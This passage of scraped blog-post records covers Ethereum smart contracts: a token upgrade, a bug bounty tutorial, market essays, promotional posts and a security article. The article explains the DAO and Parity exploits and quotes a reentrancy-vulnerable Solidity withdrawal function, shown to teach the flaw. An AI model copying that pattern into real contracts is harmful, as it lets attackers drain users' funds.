ledger to replicate all token balances from the V1 ledger.The balances from the V1 token contract and V1 ledger are still visible, but no longer usable.cardstack.eth will resolve to the V2 token contract address.Keep on reading for full details.Decimal 18Our V1 token contract (0x1ed2\u2026) and ledger used \u201cdecimal 0,\u201d meaning the smallest possible unit was 1 CARD.Since the TGE, we decided to change the token contract and ledger to \u201cdecimal 18,\u201d which makes the smallest possible unit 1*10^18 CARD, and gives Cardstack Tokens the same level of divisibility as Ether (1 wei = 1*10^18 ETH).This allows users to transact in fractional CARD tokens, ensuring the long-term utility of Cardstack Tokens.The upgradeIn brief, Cardstack\u2019s smart contract system works by using a \u201cregistry contract\u201d to manage underlying ledger contract(s), token contract(s), and storage contract(s). (For more detail, read this writeup.)The registry contract is also an ENS resolver, directing requests from cardstack.eth to the appropriate contract.To upgrade any of the contracts (e.g. the token contract), we deploy a new version of that contract. The registry contract unbinds with the old version and binds with the new version.V2 token contract and ledger replaces V1 token contract and\u00a0ledger.For this upgrade, we deployed a new V2 token contract (0xb07e\u2026) and ledger to replace the V1 token contract and ledger. Then the registry contract connected everything back together.Replicating token\u00a0balancesBecause we changed the decimal system from 0 to 18 in this upgrade, we had to recreate our entire ledger using decimal 18.To accomplish this, we sent transactions from the V2 smart contract to the V2 ledger, replicating all the token balances from the V1 ledger.On the smart contract level, tokens on the V2 ledger go out to 18 more decimal places. This value does not represent a change in the amount of CARD\u200a\u2014\u200athink of it as Cardstack tokens becoming 10\u00b9\u2078 times more high-resolution.In this sense, the V2 token contract is like a \u201clens\u201d that allows you to read the V2 ledger in normal units of CARD.The balances from the V1 token contract and V1 ledger are still visible, but no longer usable.Wallets that are connected to our V2 token contract will detect the decimal 18 system, and display balances and transactions in normal units of CARD.However, if you are a developer and want to interact with our smart contract via JSON ABI or introspect our smart contract code directly, you will have to take into account the 18 decimals, as the raw balances in our V2 ledger now contain 18 additional decimal places.cardstack.ethOur upgradable smart contract system means that the our token will be located at a new Ethereum address after each upgrade.Old token contracts (and ledgers, if applicable) will still be visible, but no longer usable.For security and simplicity, we have registered cardstack.eth with Ethereum Name Service (ENS) to point directly to our registry smart contract, which will always resolve to our newest Cardstack Token Smart Contract address.ENS allows contracts to be addressed using a human-readable phrase instead of the string of hexadecimal characters that comprise a raw token address.Now you won\u2019t have to worry about knowing our 42-character token address, or worrying if you have the most up to date one\u200a\u2014\u200ait will always be located at cardstack.eth.Next upgrade cycle: stable contract, living\u00a0contractFor some third-party ERC20 functions, it is important to keep a stable token contract address, as some Ethereum-based services do not have underlying ENS resolver functionality.That\u2019s why our smart contract architecture allows for multiple token contracts working side by side, each with full access to the ledger contract.The stable and living contract work side by\u00a0side.We plan to keep our fully audited V2 token contract as our \u201cstable\u201d ERC20 token contract, forming a dependable bridge to third-party services that require standard integrations.However, we plan to deploy an additional \u201cliving\u201d ERC20 token contract that will work side-by-side with the stable contract, so that the Cardstack Framework can continue to gain upgrades without affecting third-party integrations.Both the living contract and the stable contract will reflect token balances consistently. The living contract will include all the functionality of the stable contract.For end users, cardstack.eth will resolve to the living contract.DashboardWe are updating our dashboard app to be display token balances correctly using the V2 token contract and V2 ledger.We will be making lots of additional improvements to our dashboard as we continue to upgrade our smart contract. For example, in the near future we plan to add additional server side computation in order to display richer details about a user\u2019s history and relationship to their tokens.We will provide more details about dashboard updates soon.Security AuditOur V1 contract passed two security audits prior to the Token Generation Event. We have just completed a third security audit to ensure the security of our V2 token contract. There were no major changes or recommendations.Batch A & B\u00a0TokensEarly Contributor (Batch A) and Pre-Allocation (Batch B) tokens have not yet been distributed. These tokens will be distributed prior to the token unlock, and will be distributed using our V2 token contract.", "responses": "5"}, {"title": "Setting Up a Bug Bounty Smart Contract with OpenZeppelin", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://blog.zeppelin.solutions/setting-up-a-bug-bounty-smart-contract-with-openzeppelin-a0e56434ad0e?source=search_post", "post_date": "Jul 12, 2017", "readtime": "6 min read", "upvotes": "142", "content": "Setting Up a Bug Bounty Smart Contract with OpenZeppelinGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingJul 12, 2017Collect Some Bounty\u00a0TokensThe effect of having a market cap north of $10 Billion USD is that a growing number of blockchain enthusiasts trust putting their Ether only in smart contracts that have been vouched and fine-combed by security professionals.Among the emerging best practices, the most recommended are to write extensive unit tests, have the code audited by specialists and set up a bug bounty program. I won\u2019t elaborate on the first two recommendations as they deserve entire blog posts on their own, but in this blog post you will learn about how to setup bug bounty programs for your smart contracts.The advantage of setting up bug bounty program is that security researchers from all over the world are incentivized to have a go at hacking your smart contract for a period of time. If the smart contract is broken into, the researcher collects Ether and you learn where the vulnerability lies in your code.Another upside is that the process is able to be fully automated on the Ethereum blockchain and with the Bounty smart contract from the OpenZeppelin library, any blockchain developer is able to set up a bug bounty program within a reasonable amount of time. Let\u2019s see how this is achieved.First off, let\u2019s bootstrap the project using Truffle.$ mkdir bug-bounty-example && cd bug-bounty-example && truffle initNext step is to add the OpenZeppelin library.$ npm install zeppelin-solidity --saveThis adds the zeppelin-solidity folder to node_modules and in it you will find all smart contract templates from the OpenZeppelin library. For this project we only need Bounty.sol\u00a0, SafeMath.sol\u00a0, Ownable.sol\u00a0, PullPayment.sol and Destructible.sol\u00a0. If you just want to jump to the code, this is the repo where it resides: https://github.com/gustavoguimaraes/bug-bounty\u00a0.Moving on.To set up a bug bounty program we need a smart contract that others will try to break. Let\u2019s code up a smart contract that locks a user\u2019s ether for any amount of time in the future.$ touch contracts/LockYourEther.solAnd include the following contract:The LockYourEther contract keeps track of the User in a mapping hash function which has access to a value and releaseDate\u00a0. A User is able to lockFundsUntil a date in the future when it is able to withdraw the Ether from the contract (and hope that Ether will triple in value by then).Now onto setting up the bug bounty program. This is the high level procedure:Create a bounty contract that inherits from OpenZeppelin\u2019s Bounty.sol and have a deployContract() function which has to return a new contract address every time. In our case, we will return theLockYourEther contract address.Have LockYourEther inherit from Target contract found in OpenZeppelin\u2019s Bounty.sol\u00a0. Add another function to LockYourEther called checkInvariant() which checks state variables within the contract. These must betrueat all times. That is to say that you need to check if the contract state remains as intended. Example of implementations of checkIvanriant() could be: checking if the total supply of all tokens equals the number of tokens that handed out on a token crowdsale, whether the timestamp of a variable in the contract is > now and so on and so forth.Deploy the contracts to the blockchain.Set the Bounty reward.Let\u2019s create the Bounty contract:Firstly, we override theBounty contract function deployContract function with our own so as to instantiate LockYourEther version for the bounty program for us.Next, we includecheckInvariant() inLockYourEther and ensure that it derives from theTarget contract found at Bounty.sol.Here we are checking if the total Ether value from balances must match the state variable totalLockedWei\u00a0. We know that if these are not equal the contract is not storing the ether or withdrawing as it should.Now for the deployment:In migrations/2_deploy_contracts.jsflesh it out with the JavaScript that lets Truffle deploy the contracts:Run the Truffle command to the desired Ethereum blockchain of your choice: kovan or ropsten which are test nets (For n00bs out there, these are examples of test nets that we can deploy and test our contracts on decentralized environments), or main net for the actual bug bounty program.Lastly, set the reward for the bounty program.Using truffle console\u00a0:> LockYourEtherBounty.deployed().then(inst => {bounty = inst})> address = 0xb9f68f96cde3b895cc9f6b14b856081b41cb96f1; // your account address> bountyAddress = bounty.address> reward = 20 // reward to pay to a researcher who breaks contract> bounty.sendTransaction({ from: address, value: web3.toWei(reward, \"ether\") })> bountyValue = web3.eth.getBalance(bountyAddress).toNumber()> web3.fromWei(bountyValue, 'ether')'20'Voil\u00e1, the bug bounty program is setup.I purposely left a bug in the LockYourEther. Are you able to find it and get the bounty reward?Give it a try, I will give you a few minutes\u00a0\u2026", "responses": "3"}, {"title": "The Smart Contract Network\u00a0Fallacy", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/the-smart-contract-network-fallacy-7b4d27f4d149?source=search_post", "post_date": "Aug 29, 2017", "readtime": "6 min read", "upvotes": "199", "content": "The Smart Contract Network\u00a0FallacyBlockChannelBlockedUnblockFollowFollowingAug 29, 2017Note: This post assumes foundational understanding of crypto. This post was originally featured on BraveNewCoin and was written by Kyle Samani of Multicoin Capital.Ethereum is unquestionably the market leading smart contract platform. It\u2019s the oldest and most mature. It likely has the best protocol developers and certainly has the best community. Developer interest is surging. Major companies are investing in the platform. It has a clear roadmap. It\u2019s led by one of the brightest minds of our era.Ethereum\u2019s network value is about $30B. Here\u2019s the competition:NEO\u200a\u2014\u200a$2BEthereum Classic\u200a\u2014\u200a$1.5BQTUM\u200a\u2014\u200a$.9BStratis\u200a\u2014\u200a$.6BWAVES\u200a\u2014\u200a$.5BEOS\u200a\u2014\u200a$.5BLisk\u200a\u2014\u200a$.25BAt current prices, the combined network value of all of Ethereum\u2019s competitors is about 10\u201315% of Ethereum\u2019s network value.Market prices imply that Ethereum has a strong network effect. Ethereum presents itself as the \u201cworld computer,\u201d which naturally begs for OS-like analogies: the more developers use Ethereum, the more users will want Ether, which encourages more developers, etc.This analogy doesn\u2019t capture the nuance of the dynamics at play. Smart contract platforms like Ethereum should not be compared to operating systems, but rather to programming languages.Specifically, the OS analogy misrepresents the network effects for the supply side (why should developers choose Ethereum) and demand side (why should users buy Ether). Concerns about network security are valid, but can be largely mitigated through cross-chain anchoring.I\u2019ll walk through each of these fallacies below.DEMAND SIDE\u200a\u2014\u200aUSERS WON\u2019T\u00a0CAREOperating systems create network effects because users make a mutually exclusive decision to use one OS at the expense of not choosing another OS. You cannot run Windows and Linux on your desktop (ignoring virtual machines since only a small minority of users have a need or technical ability to leverage virtual machines effectively).Since users are locked into an OS, developers naturally develop for the OS. This creates more and better apps for the OS, which draws in more users. The virtuous cycle flourishes.Users won\u2019t have to know or care about which blockchain they\u2019re interacting with. To most users, blockchains will be abstracted to \u201cplease enter your password to verify your transaction.\u201dAs a user interacting with distributed applications (Dapps), you will never \u201csee\u201d a blockchain. All you will see is a web3 front end that triggers an on-chain transaction using a tool such as Parity or Metamask (for the rest of this post, I\u2019ll refer to these types of tools as web3 clients even though web3 is technically Ethereum-specific). Although web3 clients don\u2019t yet exist for non-Ethereum chains, they\u2019re being built and will be available soon, and they\u2019ll support multiple chains. In time, browsers will natively implement multi-chain web3 clients.Web3 clients themselves can abstract this problem even further. As web3 clients implement support for many chains, they\u2019ll also integrate decentralized exchanges such as Shapeshift and 0x. As a user, if you try to interact with a Dapp that requires Stratis tokens, but you only have Ether, your web3 client will seamlessly sell your Ether for Stratis on an exchange in real time. Then the web3 client will send those Stratis tokens to the Dapp. As a user, you won\u2019t know or care about the underlying token at all.Your web3 client will generate a mnemonic seed that\u2019s used to derive private keys, public keys, and addresses for all supported chains. As a user, you\u2019ll only have to memorize/store one \u201cpassword\u201d and everything else will be seamless.To sum up all of the above, as a user, you won\u2019t have to care what chain or token you\u2019re using. All Dapps will, regardless of underlying technology platform, just work. All chain and token complexity will be abstracted away.SUPPLY SIDE\u200a\u2014\u200aINTEROPERABLE TOKENS COMMODITIZE CHAINSWith any two smart contract platforms, tokens can roam across chains. ETH tokens will not be bound to the Ethereum chain. Stratis tokens will be available on the NEO chain, and Tezos tokens will be available on the WAVES chain.How? Synthetic tokens.Imagine a two known smart contracts, one on the ETH chain, one on the ETC chain. If I want to move X ETH tokens to the ETC chain, I send some ETH to that contract on the ETH chain and specify my ETC address. When the ETH contract receives my ETH, it triggers the ETC contract to release X tokens to my ETC address. Those synthetic tokens can also be called ETH. This system works in both directions.(I recognize this diagram doesn\u2019t correctly portray how smart contracts issue tokens on a technical basis, but it\u2019s still useful to illustrate how assets move across chains)This function will level the playing field between chains. When any coin will run on any chain, why care about the chain or the token at all? A lot of complexity gets abstracted away.Note there is one obvious downside to this mechanism: gas costs on each chain must be paid in the chain\u2019s native currency. However, gas costs shouldn\u2019t be significant on a % basis. If more than\u00a0.1-.2% of transaction volume is being paid in gas, the chain itself will probably fail. In light of the framework I proposed above, the \u201chow does a user pay for gas?\u201d question is legitimate, but not substantial in impact relative to the gains of token-chain abstraction.MITIGATING NETWORK SECURITY RISKS THROUGH CROSS CHAIN ANCHORINGAs a token loses network value, risk of 51%-style attacks increases. This is obviously true for proof-of-stake consensus systems. It\u2019s also true for proof-of-work consensus systems as miners choose which coins to mine based on cost to mine vs value of the coin.But even network security risk can be mitigated through cross chain anchoring. Ethereum is adopting this mechanism in Plasma by committing merkle roots from child chains to parent chains. This is live in Factom today: Factom anchors a merkle root of its own chain to every Bitcoin block.In time, we\u2019ll start to see most chains anchor themselves to other chains as a form of risk mitigation. Attacking a network will require attacking all anchored networks. This is exponentially more difficult than attacking a single chain.SMART CONTRACT PLATFORMS ARE LIKE PROGRAMMING LANGUAGESIf users won\u2019t care about underlying chains, if the tokens are instantly and seamlessly tradeable, if tokens themselves roam across chains, and if network security can be maintained, what avenues of differentiation are left between chains? Basically, dev tools and governance mechanisms.Stratis has a singular focus: make it as easy as possible for C# devs to build using blockchains. There are millions of C# developers today, most of whom probably don\u2019t want to learn Solidity (native Ethereum language) or Ocaml for Tezos. You could argue that C# developers are being irrational and should learn languages that are designed specifically for blockchains. For example, it\u2019s unlikely that Stratis will be able to implement formal verification since C# wasn\u2019t designed with formal verification in mind.On the other hand, Javascript was developed as a front end language, but is now one of the most popular back end languages courtesy of Node.js. Some developers hate loosely typed languages like Javascript. Others hate statically-typed language likes C.Even though all of the major programming languages today provide Turing-completeness, the market has empirically demonstrated a need for many programming languages with unique tradeoffs (readability, compiled vs interpreted, abstractions, memory management, native performance, parallelizability, etc).A single blockchain shouldn\u2019t dictate the rules and mechanics of all smart contract development. Given the lack of strong network effects, many smart contract platforms will thrive.Now let\u2019s turn to governance. Dash has had on-chain governance for a few years. By all accounts, it seems to work rather well. Tezos has presented a variation of Dash\u2019s on-chain governance. The Dash community is thriving, innovating, and growing. On-chain governance may be what blockchains have always needed but never had.There aren\u2019t any historical counterfactuals to prove this case. Bitcoin has obviously faced serious governance challenges in the last couple of years, but many open source projects have thrived in the absence of on-chain governance. The Linux kernel, the many Linux desktops, Firefox, Wikipedia, Chrome (and all of its forks), the Android Open Source Project (and all of its forks), WebRTC, Ethereum itself, and many other open source projects have succeeded without a formal stakeholder engagement model.SUMMARYCurrent market prices imply that Ethereum is going to be the runaway market leader for smart contract platforms. This is not a given. There are many secular trends at the demand level, supply level, and security level that commoditize most of Ethereum\u2019s perceived advantages. Ethereum will not be the sole smart contract platform. That\u2019s not to say Ethereum isn\u2019t here to stay or that Ethereum won\u2019t thrive. I wouldn\u2019t bet against Ethereum. But there will be huge opportunities for non-Ethereum smart contract platforms. Ethereum will not be the one smart contract platform to rule them all.", "responses": ""}, {"title": "Zerion Will Collaborate With Qtum on Smart Contract\u00a0Services", "author_name": "Qtum", "link": "https://blog.qtum.org/zerion-will-collaborate-with-qtum-on-smart-contract-services-3467d033a78c?source=search_post", "post_date": "Dec 20, 2017", "readtime": "2 min read", "upvotes": "252", "content": "Zerion Will Collaborate With Qtum on Smart Contract\u00a0ServicesQtumBlockedUnblockFollowFollowingDec 20, 2017We are excited to announce that Qtum has started a collaboration with Zerion, an industry-leading blockchain investment platform. Zerion will be integrating the Qtum platform and their services will now support Qtum smart contracts.In July of this year, the Qtum team met with Alex Bash, Zerion\u2019s Chief Technology Officer during BlockchainHack in Moscow, where both of our teams were event sponsors and on the jury board. There, the Qtum team learned more about Zerion and their vision for the future.Working with a team of leading engineers, Zerion\u2019s platform provides a solid interface for smart contract-based crowdfunding to help open-source projects raise capital all over the world and for backers to securely and seamlessly fund projects at any stage\u200a\u2014\u200aall in one place, with one single Zerion account.\u201cThe future of finance is decentralization and tokenization. Zerion\u2019s mission is to power the blockchain revolution by directly connecting the next generation of trustworthy projects and products to the world. We believe we share many common values with the Qtum team, and are excited to integrate their powerful technology into the future of our platform!\u201d \u2013 Evgeny, Founder & CEO\u200a\u2014\u200aZerionAt Qtum, we are always searching for new ways to collaborate with innovative and professional teams, and we are excited to begin building this relationship with Zerion.", "responses": ""}, {"title": "Will Smart Contracts Eat the\u00a0World?", "author_name": "Taylor Pearson", "link": "https://hackernoon.com/will-smart-contracts-eat-the-world-part-one-what-are-smart-contracts-d2cea816035b?source=search_post", "post_date": "Nov 15, 2018", "readtime": "4 min read", "upvotes": "357", "content": "Will Smart Contracts Eat the\u00a0World?Part One: What are Smart Contracts?Taylor PearsonBlockedUnblockFollowFollowingNov 15, 2018In 1994, Nick Szabo, a legal scholar and computer scientist, coined the term \u201csmart contract\u201d to describe the ability to embed contracts, a legal construct, into computer code.With the emergence of a blockchain ecosystem, the excitement around smart contracts has picked up.In this article, I\u2019m going to explore what smart contracts are and why it\u2019s valuable to combine them with blockchain technology to make \u201cblockchain smart contracts.\u201d In the next article in the series, we\u2019ll dive into the core problems they solve at a high level and then look at some potential specific-use cases. We\u2019ll finish up by looking at the barriers and drawbacks of smart contracts. Alas, there is no free lunch!What Is a Smart Contract\u00a0Anyway?The simplest example of a smart contract is a vending machine:IF someone puts in a dollarANDIF they press the button for Diet CokeTHEN dispense a Diet CokeSmart contracts allow for the conversion of \u201cwet code,\u201d human-readable language like legal contracts, into \u201cdry code,\u201d computer-readable language. Wet code is more malleable and subject to interpretation, which can make it more flexible, but it can also make it less fair and more expensive (lawyers gotta make that Ke$ha too). Dry code is more rigid and deterministic, which makes it less flexible, but cheaper and fairer.Though we don\u2019t think about them much, contracts are an essential building block of our economy. As economist Ronald Coase pointed out, a firm is just a nexus of contracts with employees, vendors, shareholders and customers.You live in your home or apartment because you have a contract with a bank (a mortgage) or landlord. Whoever owns your home has a contract with a government entity that maintains the property title register saying who the home belongs to. In many ways, our lives are just nexuses of contracts\u200a\u2014\u200aemployment contracts, mortgage contracts and marriage contracts.The basic idea behind smart contracts is that many kinds of contractual clauses (such as collateral, bonding, delineation of property rights, etc.) can be embedded in the hardware and software we deal with, in such a way as to make breach of contract expensive (if desired, sometimes prohibitively so) for the breacher and, in so doing, reduce the transaction costs associated with that contract.A more complex example than vending machines might be dealing with a car lease. A car could have a \u201csmart lien\u201d protocol where if someone failed to meet their contractual obligation of making the lease payment, their electronic key no longer works and a key owned by the bank activates the car instead.This would be a lot cheaper than using a repo man to chase down the car. If the car was autonomous, you could make it part of the contract that if a payment was not met, the car would simply drive itself to a location designated by the creditor. When the car purchaser paid off the car in full, the contract would make the key that the bank was holding useless. Additional clauses could be added for safety. You wouldn\u2019t want to revoke operation of the car while it\u2019s doing 75 miles an hour on I-40.Dry, Smart Contracts Vs. Wet, Legal ContractsSmart contracts are not intended to replace existing common law, but to extend them and make it easier for individuals, businesses and eventually computers to make contracts with each other.There are four important properties to good contracts:ObservabilityVerifiabilityEnforceabilityPrivacyIf you enter into a contract with someone, like an employment contract, you want to be able to:Observe they are doing what they said they would do in the contract.If they don\u2019t, you want to be able to have a way to verify that they didn\u2019t do what they said they were going to do.Have a way to enforce consequences for breach of contract.Ideally, you would also like to keep the contract private. Not everyone needs to know the terms of your employment contract or mortgage.Today, the main role of the accounting industry is to take the \u201cnexus of contracts\u201d that make up the economy and make them observable. The role of the auditing and investigation industries is to verify contracts. The role of the judicial system is to enforce those contracts: if someone violates a contract with you, you have the right to take them to court and punish them (through arrest, confiscation of property, etc.) for violating the contract.Now that we\u2019ve looked at the basics of smart contracts, next week we\u2019ll look at two ways in which blockchain smart contracts could help the existing system be more efficient and fair.If you\u2019re looking for more about blockchain and cryptocurrency for business, enter your email here to receive the full essay as a beautiful PDF to read later.", "responses": "5"}, {"title": "Why We Invested In SmartContract", "author_name": "Richard Dulude", "link": "https://blog.underscore.vc/beyond-the-chain-why-we-invested-in-smartcontract-3a984b912ba9?source=search_post", "post_date": "Sep 20, 2017", "readtime": "6 min read", "upvotes": "235", "content": "Why We Invested In SmartContractRichard DuludeBlockedUnblockFollowFollowingSep 20, 2017Getting Beyond the Chain: Solving the Connectivity Problem, a Key Limiting Factor for Smart Contract\u00a0AdoptionW e are excited to announce our latest blockchain investment behind Sergey Nazarov and Steve Ellis, the founders of SmartContract (www.SmartContract.com).As we touched upon in our \u201cTrusted Cloud Intelligence\u201d investing thesis, we believe the next generation of cloud infrastructure will have trust, security, and intelligence built in. These will be features as native and as fundamental as connectivity to the internet is itself.The recent breach of Equifax reminds us how out-of-date and vulnerable our personal data is when centralized. We have put trust into intermediaries to secure our data in repositories that are not often even aware of the various uses of that data and potential breaches to it. Moreover, critical data is constantly being transmitted across the information supply chain with little guarantee of its security and no record or audit trail of it\u2019s use.It is a broken system at best, that is full of friction and shortcomings, and at worst, too easily targeted and breached.That is why we are excited to see leading entrepreneurs like Sergey and Steve bringing the promise of real \u201csmarts\u201d into the next generation of cloud infrastructure, with new foundational technologies like smart contracts and oracles on the Blockchain that have trust, security, and intelligence natively built in.For those who aren\u2019t as familiar with the promise and challenge of \u2018smart contracts\u2019\u200a\u2014\u200avery simply, they are software code on the blockchain that is guaranteed to execute. Smart contracts codify \u201cwhat should be done automatically\u201d and remove the error prone manual efforts around existing digital agreements.Unfortunately, because of their underlying consensus protocols, the blockchains on which smart contracts run cannot support native communication external systems and data.In short, the \u201csmart\u201d contracts are actually \u201cdumb\u201d (simple) without external data! This is a fundamental limitation that is solved by \u2018oracles\u2019 securely linking to external data and in turn, making smart contracts truly smart!SmartContract ChainLink Enables External \u201cOff-Chain\u201d Data\u00a0AccessSmartContract ChainLink: A decentralized oracle network that makes dumb contracts smart.Today, your best alternative to link external data into the blockchain is through a centralized solution. Want to grab the interest rate via API? \u2192 You\u2019ll have to send it through a centralized service that any that could be manipulated and completely change the payout of the self-executing smart contract (not a small deal when $ millions are being payed out automatically and immutably!). Current approaches to \u2018oracles\u2019 that access external data induce a single point of failure solved by SmartContract\u2019s ChainLink Network, a decentralized oracle network to provide trusted linking to external data and resources.As pointed out in the team\u2019s whitepaper, some of the most interesting applications of smart contracts rely precisely on this external information from the real world feeds and APIs.Here are just a few examples of powerful smart contracts that bring in external data to the blockchain to automate contract execution:Financial Securities smart contracts\u200a\u2014\u200afinancial instruments such as bonds, interest rate derivatives, and many others will require access to APIs reporting market prices and market reference data (e.g. interest rates, or CDOs that can not only legally be a slice of the underlying collateral, but automate directly into the money flows behind it), all without any manual effort or an intermediary.Insurance smart contracts\u200a\u2014\u200awill need data feeds related to the insurable event in question (e.g. an agricultural insurance policy which pays out conditionally based on the quantity of rainfall in a given month, or a payment for the flight insurance you had for an departure later than you expected).IoT smart contracts\u200a\u2014\u200acan provide sensor data to smart contracts\u200a\u2014\u200aone example is supply chain custody that fuels commerce fulfillment, with data goods being shipped that can self-confirm arrival and in turn, payment without any manual intervention. Another example is a lab sensor from a company like TetraScience (www.tetrascience.com) that can order a biochemical, verify and timestamp the arrival, and even validate the compliance \u201cas advertised\u201d regarding reaction in a critical drug test before allowing payment.Marketplace to Access External \u201cOff-Chain\u201d DataDelivering interoperation between blockchains.When we met Sergey and Steve, we were excited to see great founders using their experience to architect a uniquely differentiated approach to solving the problem of trust through oracles that feed smart contracts information from beyond the chain. Even in our first working sessions, the team showed their great vision for the ChainLink Marketplace that makes getting any data into a smart contract easy, whether it\u2019s:Market data (Bloomberg, NYSE)Bank payments (SWIFT, Citi, Chase, HSBC)Retail payments (PayPal, Visa, MasterCard)Events data (weather, GPS)Backend system of record (Salesforce, SAP)All web APIs\u2026 and even other blockchains.A huge market with strong community backingAs the primary interfaces to and from the real world and the digital world, we\u2019ve long believed that oracle services will be a huge market and SmartContract.com is tapping right into it.With a SaaS solution, SmartContract.com offers 24/7 support for information providers such as big ratings agencies that can now sell data into smart contracts, in a decentralized (and hence resilient & secure) way, that is fully open source, cross chain, and even extends to private chains. To be clear, SmartContract.com provides various enterprise sales, implementation, technical, and administrative support to the open source and community-driven protocol being worked on by SmartContract ChainLink, Ltd.In short, with SmartContract.com developers can now quickly build fully connected and functional smart contracts in minutes! Trustworthy oracles from established brands in the marketplace will make entirely new economic flows possible. Moreover, since we\u2019ve met the team, we\u2019ve seen a strong group from the from the blockchain community around us join on as advisors:Ari Juels\u200a\u2014\u200aformer RSA Chief Scientist and a distinguished academic for his contributions to decentralized infrastructure through such work as the Proof of Retrievability paper that companies including Storj, Sia, and Filecoin are heavily based upon.Hudson Jameson\u200a\u2014\u200athe Ethereum community manager and an authority on smart contracts, Ethereum\u2019s development roadmap, blockchain and digital currency.Andrew Miller\u200a\u2014\u200aan authority on the creation of secure decentralized systems that has advised Zcash, Bezos, and the ChainLink Network and is an assistant professor of computer science at the University of Illinois at Urbana-Champaign.Jake Brukhman\u200a\u2014\u200afounder of the CoinFund, a blockchain technology research companyBrian Lio\u200a\u2014\u200athe CEO of Smith + Crown, a research and consulting group focused on providing insight, analysis and data across the breadth of technologies, projects, organizations and trends within the blockchain.Evan Cheng\u200a\u2014\u200aFacebook\u2019s Director of Engineering that has played key roles in running secure tamper-proof systems run by some of the world\u2019s leading technology companies, including Google, Intel, AMD, and Nvidia.Already a Gartner Blockchain Cool\u00a0VendorSmartContract.com has already been selected by Gartner as a 2017 Blockchain Applications Cool Vendor, validating the significant business value that CTOs, CIOs, and Lead Architects have seen in their secure approach to connecting smart contracts with critical external resources. But most importantly, SmartContract.com has already acquired industry leaders in financial technology as paying customers. For example, SWIFT, the leading global provider of secure financial messaging services, is working with the company to create its own SWIFT solutions, which will allow smart contracts on various networks to make payments, send governance instructions, and release collateral with more than 11,000 banks.And today we\u2019re excited to announce the next stage for the ChainLink Network with a successful start of a $32m LINK token offering. This follows the earliest funding led by Underscore VC and DCVC (Data Collective) to help get the team to this milestone and beyond.All in all, our team is incredibly excited to back the SmartContract team with an aligned Underscore Core Community behind them to help catalyze their own open source community behind the ChainLink Network and fuel the evolution of the next generation of trusted cloud intelligence.", "responses": ""}, {"title": "Ethereum Smart Contract\u00a0Security", "author_name": "Stefan Beyer", "link": "https://medium.com/cryptronics/ethereum-smart-contract-security-73b0ede73fa8?source=search_post", "post_date": "Jan 28, 2018", "readtime": "8 min read", "upvotes": "305", "content": "Ethereum Smart Contract\u00a0SecurityStefan BeyerBlockedUnblockFollowFollowingJan 28, 2018IntroductionSmart contracts are self-executing contracts, in which the terms are specified in code.Whilst the concept has been around for a while, at least since Nick Szabo\u2019s wrote up the concept in 1996, it hasn\u2019t been until the advent of the turing complete Ethereum blockchain that smart contract use has become common.Contracts in Ethereum live at contract addresses and can be invoked by transaction calls. Executing contracts written in code and stored on an immutable public blockchain creates certain risks and security issues. We will discuss these issues and possible mitigation actions in this article.Code is\u00a0Law?A literal interpretation of the smart contract idea leads to the \u201cCode is Law\u201d paradigm, which means that smart contracts are binding and are interpreted as if they were legal documents. Any software engineer aware of the impossibility to create completely error free code will get sweaty hands at the thought of a computer program being legally binging. There are a number of obvious problems:Code contains bugs. It\u2019s extremely difficult to write bug-free code and even if all possible precautions are taken, there will always be unexpected execution paths or possible vulnerabilities in reasonably complex software.Legal contracts are subject to interpretation and arbitration. It is very difficult to create air-tight contracts. In any large contract, typos may slip in and some clauses need to be interpreted and arbitrated. That\u2019s what courts do in case of dispute. If in a legal contract sale price is specified as $100 on 39 out of 40 pages and on one page an additional zero sneaks in, a court would rule in \u201cthe spirit of the contract\u201d. A computer just executes the clause as written. The immutability of the blockchain adds to this problem, as contracts cannot be amended easily.Software engineers are no legal experts and vise versa. A different skill set is required to draft a good contract, not necessarily compatible with writing a good computer program.Two Examples of High-profile Smart Contract\u00a0ExploitsThe DAO\u00a0AttackA lot has been said already about this case, which we will not repeat here. A good overview of the attack and the aftermath can be found here.In summary, in June 2016, an attacker managed to divert a large amount of crowdsourced funds (3.5M ETH, approximately 15% of total ETH at the time) into his own child contract, in which the funds were locked for 28 days, leading to a race against time to find a solution.The important point to note in this case, is that the contract was attacked by making it behave in an unexpected way. In this particular case reentrancy vulnerabilities were exploited. We will look at reentrancy further on in this article.The Parity\u00a0HackThis was in fact the second hack of the multi-signature wallet contract provided by Parity. The multisig wallet contract, used by many startups, had most of its logic implemented in a library contract. Each wallet consisted in a light-weight client contract connecting to this single point of failure.Parity Multisig ArchitectureThere was a crucial bug in the library contract, which consisted in an initialisation function being able to be called exactly once.In November 2017, someone did initialise the contract and by doing so converted himself into the owner of the contract. This then allowed him to invoke owner only functions, a privilege he used to call the following function:// kills the contract sending everything to `_to`.function kill(address _to) onlymanyowners(sha3(msg.data)) external {    suicide(_to);}This is the equivalent of a self-destruct button, which renders the contract useless. Calling this function caused all the funds of the client contracts to be frozen, probably forever.At the time of writing, it is still unclear wether the hack constituted a deliberate attack or was accidental, with the perpetrator claiming accidental actions.Both attacks show, that even relatively simple contracts, written by the biggest players in the Ethereum ecosystem are prone to basic bugs with serious consequences.Known Vulnerabilities and\u00a0PitfallsPrivate Key\u00a0LeakageUsing unsafe private keys is really a case of user error, rather than a vulnerability. However, we mention this nevertheless, as it happens surprisingly often and certain players have specialised in stealing funds from unsafe addresses.What usually happens is that development addresses (such as those used by Ganache/TestPRC) are used in production. These are addresses generated from publicly known private keys. Some user have even unknowingly imported these keys into wallet software, by using the Ganache seed words to generate the same private keys.Attackers are monitoring these addresses and any amount transferred to a TestRPC address on the main Ethereum chain tends to disappear immediately (within 2 blocks). This highly lucrative \u201csweeping\u201d activity has been investigated in this interesting study, which found that one sweeper account had managed to accumulate funds worth $ 23 million.Reentrancy and Race ConditionsReentrancy vulnerabilities consist in unexpected behaviour, if a function is called various times before execution has completed.Let\u2019s look a the following function, which can be used to withdraw the total balance of the caller from a contract:mapping (address => uint) private balances;function payOut () {    require(msg.sender.call.value(balances[msg.sender])());     balances[msg.sender] = 0;}The call.value() invocation causes contract external code to be executed. If the caller is another contract, this means that the contracts fallback method is executed. This may call payOut() again, before the balance is set to 0, thereby obtaining more funds than available.The solution to this is to use the alternative functions send() or transfer(). These forward just enough gas for some basic housekeeping and any attempt at calling payOut() again would run out of gas.A similar race condition may occur without calling a function repeatedly, if a contract has two functions that access shared state. Therefore, it\u2019s always best practise to make state changes before the transfer, i.e. in the above code the balance should be set to 0 before the funds are 